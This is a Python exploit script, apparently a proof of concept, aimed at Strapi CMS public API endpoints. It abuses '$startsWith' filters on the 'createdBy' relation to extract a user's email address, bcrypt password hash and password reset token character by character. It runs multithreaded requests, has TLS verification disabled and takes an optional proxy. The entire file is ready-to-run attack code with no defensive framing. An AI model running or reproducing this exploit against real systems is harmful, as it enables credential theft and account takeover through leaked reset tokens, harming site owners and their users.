import requests, sys, argparse
import urllib.parse as urlparse
import urllib3
from concurrent.futures import ThreadPoolExecutor

THREADS=20
BCRYPT_CHARS = "$./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
EMAIL_CHARS = "@.abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
TOTAL_CHARS = len(BCRYPT_CHARS)
TOTAL_EMAIL_CHARS = len(EMAIL_CHARS)

urllib3.disable_warnings()

# when specifying the endpoint, one can use pagination as following:
# /api/articles?pagination[limit]=50&pagination[start]=50

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()


    parser.add_argument(
        '-u', '--url',
        help='Target URL',
        required=True
    )

    parser.add_argument(
        '-e', '--endpoint',
        help='The public endpoint on Strapi which have relationship with User',
        required=True
    )

    parser.add_argument(
        '-i', '--id',
        help='The ID of the entry to dump (default: 0)',
        default=0,
        type=int
    )

    parser.add_argument(
        '-x', '--proxy',
        help='Proxy URL',
        type=str,
    )

    parser.add_argument(
        '-E', '--email',
        help='Dump the email',
        action='store_true'
    )

    parser.add_argument(
        '-P', '--password',
        help='Dump the password hash',
        action='store_true'
    )

    parser.add_argument(
        '-T', '--token',
        help='Dump the password reset token',
        action='store_true'
    )

    return parser.parse_args()


def attempt_char_hash(s: requests.Session, api_url, known_hash, c):
    r = s.get(
        api_url + f"?filters[$and][0][createdBy][password][$startsWith]={known_hash + c}",
    )
    r_json = r.json()
    if "data" in r_json:
        r_json = r_json["data"]

    if len(r_json) > 0:
        return (True, c)
    return (False, None)

def attempt_char_token(s: requests.Session, api_url, known_hash, c):
    r = s.get(
        api_url + f"?filters[$and][0][createdBy][reset_password_token][$startsWith]={known_hash + c}",
    )
    r_json = r.json()
    if "data" in r_json:
        r_json = r_json["data"]

    if len(r_json) > 0:
        return (True, c)
    return (False, None)


def attempt_char_leak(s: requests.Session, api_url, entry_id, field, known_leak, c):
    try:
        if '?' in api_url:
            r = s.get(
                api_url
                + f"&filters[$and][{entry_id}][createdBy][{field}][$startsWith]={known_leak + c}",
            )
        else:
            r = s.get(
                api_url
                + f"?filters[$and][{entry_id}][createdBy][{field}][$startsWith]={known_leak + c}",
            )
        r_json = r.json()
        if "data" in r_json:
            r_json = r_json["data"]

        if len(r_json) > 0:
            return (True, c)
        return (False, None)
    except Exception as e:
        return (False, None)


def dump_password_hash(s, api_url, entry_id):
    dumped_data = ""
    print("Password Hash:", end="")
    sys.stdout.flush()

    while True:
        found_char = False

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(
                attempt_char_leak,
                TOTAL_CHARS * [s],
                TOTAL_CHARS * [api_url],
                TOTAL_CHARS * [entry_id],
                TOTAL_CHARS * ["password"],
                TOTAL_CHARS * [dumped_data],
                BCRYPT_CHARS
            )

            for result in futures:
                matched_char, char = result
                if matched_char:
                    found_char = True
                    dumped_data = dumped_data + char
                    print(char, end="")
                    sys.stdout.flush()
                    break

        if not found_char:
            break
    print("")


def dump_email(s, api_url, entry_id):
    dumped_data = ""
    print("Email:", end="")
    sys.stdout.flush()

    while True:
        found_char = False

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(
                attempt_char_leak,
                TOTAL_EMAIL_CHARS * [s],
                TOTAL_EMAIL_CHARS * [api_url],
                TOTAL_EMAIL_CHARS * [entry_id],
                TOTAL_EMAIL_CHARS * ["email"],
                TOTAL_EMAIL_CHARS * [dumped_data],
                EMAIL_CHARS,
            )

            for result in futures:
                matched_char, char = result
                if matched_char:
                    found_char = True
                    dumped_data = dumped_data + char
                    print(char, end="")
                    sys.stdout.flush()
                    break

        if not found_char:
            break
    print("")


def dump_password_reset_token(s, api_url, entry_id):
    dumped_data = ""
    print("Password Reset Token:", end="")
    sys.stdout.flush()

    while True:
        found_char = False

        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = executor.map(
                attempt_char_leak,
                TOTAL_CHARS * [s],
                TOTAL_CHARS * [api_url],
                TOTAL_CHARS * [entry_id],
                TOTAL_CHARS * ["reset_password_token"],
                TOTAL_CHARS * [dumped_data],
                BCRYPT_CHARS
            )

            for result in futures:
                matched_char, char = result
                if matched_char:
                    found_char = True
                    dumped_data = dumped_data + char
                    print(char, end="")
                    sys.stdout.flush()
                    break

        if not found_char:
            break
    print("")


def main(args):
    target = args.url
    endpoint = args.endpoint
    api_url = urlparse.urljoin(target, endpoint)
    if not args.email and not args.password and not args.token:
        print("Please specify what to dump")
        sys.exit(1)

    with requests.Session() as s:
        s.verify = False
        if args.proxy:
            s.proxies = {"http": args.proxy, "https": args.proxy}

        if args.email:
            dump_email(s, api_url, args.id)

        if args.password:
            dump_password_hash(s, api_url, args.id)

        if args.token:
            dump_password_reset_token(s, api_url, args.id)


if __name__ == "__main__":
    args = parse_args()
    main(args)
